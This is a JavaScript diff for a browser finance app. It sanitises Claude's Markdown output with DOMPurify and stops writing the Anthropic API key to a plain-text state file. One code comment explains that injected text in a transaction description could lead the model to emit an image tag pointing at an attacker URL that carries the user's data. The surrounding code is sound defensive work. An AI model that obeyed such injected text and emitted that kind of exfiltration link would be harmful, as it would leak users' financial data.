@@ -61,6 +61,23 @@ const parseDate = (s, format = 'MM/DD/YYYY') => {
 };
 const escapeHtml = (s) => (s||'').replace(/[&<>"']/g, m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[m]);
 const escapeAttr = (s) => (s||'').replace(/'/g,"\\'").replace(/"/g,'&quot;');
+// Render untrusted Markdown (e.g. Claude's responses) to safe HTML for innerHTML.
+// marked converts Markdown → HTML; DOMPurify then strips scripts, event handlers and
+// javascript: URLs. Images are forbidden so injected text in a transaction description
+// can't make the model emit <img src="https://attacker/?data=..."> to exfiltrate data.
+// Falls back to escaped plain text if either CDN library failed to load.
+// Never call marked.parse() directly — always go through this helper.
+const renderMarkdown = (md) => {
+  const src = md || '';
+  if (typeof marked === 'undefined' || typeof DOMPurify === 'undefined') {
+    return `<div style="white-space:pre-wrap">${escapeHtml(src)}</div>`;
+  }
+  return DOMPurify.sanitize(marked.parse(src), {
+    USE_PROFILES: { html: true },
+    FORBID_TAGS: ['img', 'style', 'form', 'input', 'button', 'textarea', 'select'],
+    FORBID_ATTR: ['style'],
+  });
+};
 const downloadFile = (name, content, mime) => {
   const blob = new Blob([content],{type:mime||'text/plain'});
   const a = document.createElement('a');
@@ -83,6 +100,15 @@ async function loadStateFromFile() {
     const file = await fileHandle.getFile();
     const text = await file.text();
     const loaded = JSON.parse(text);
+    // The Anthropic API key never comes from (or goes to) this file. Versions up to
+    // v1.7.0 wrote it here in plain text: move it into browser storage if that's the
+    // only copy, drop it from the loaded state, and schedule a save so the file is
+    // rewritten without it.
+    if ('apiKey' in loaded) {
+      if (loaded.apiKey && !State.apiKey) { State.apiKey = loaded.apiKey; lsSet('apiKey', loaded.apiKey); }
+      delete loaded.apiKey;
+      _saveStateDebounced(State);
+    }
     console.log('[FinLens] State loaded from finlens-state.json');
     return loaded;
   } catch(e) {
@@ -103,7 +129,9 @@ async function saveStateToFile(state) {
     }
     const fileHandle = await dirHandle.getFileHandle('finlens-state.json', { create: true });
     const writable = await fileHandle.createWritable();
-    // Serialize State, being careful with non-serializable properties
+    // Serialize State, being careful with non-serializable properties.
+    // apiKey is deliberately excluded: secrets stay in browser storage only
+    // (localStorage + IndexedDB app_state), never in a plain-text file on disk.
     const serializable = {
       transactions: state.transactions,
       accounts: state.accounts,
@@ -116,7 +144,6 @@ async function saveStateToFile(state) {
       manualBalances: state.manualBalances,
       categoryRules: state.categoryRules,
       categories: state.categories,
-      apiKey: state.apiKey,
       aiHistory: state.aiHistory,
       scenarios: state.scenarios,
       investAlloc: state.investAlloc,
